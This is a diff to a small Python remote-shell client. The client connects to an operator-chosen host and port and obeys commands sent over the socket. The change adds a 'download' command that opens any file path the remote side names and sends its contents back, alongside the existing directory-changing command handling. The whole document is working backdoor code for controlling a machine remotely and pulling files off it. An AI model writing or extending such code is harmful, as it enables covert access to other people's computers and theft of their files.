@@ -7,13 +7,21 @@ host = input(("Host: "))
 port = int(input("Port: "))
 s.connect((host, port))
 
+BYTES = 10000
+
 while True:
-	data = s.recv(2048)
+	data = s.recv(BYTES)
 	# if first 2 characters are cd, change dir to next characters
 	# note the :2 is before and the 3: is after
 	if data[:2].decode("utf-8") == "cd":
 		os.chdir(data[3:].decode("utf-8"))
-	elif data
+	elif data.decode("utf-8") == "download":
+		file_path = s.recv(BYTES)
+		file_path = file_path.decode()
+		file = open(file_path, "rb")
+		contents = file.read()
+		s.send(contents)
+		print("File sent succesfully")
 
 	# this must not be elif so it gets executed and actually sends the output stuff
 	if len(data) > 0:
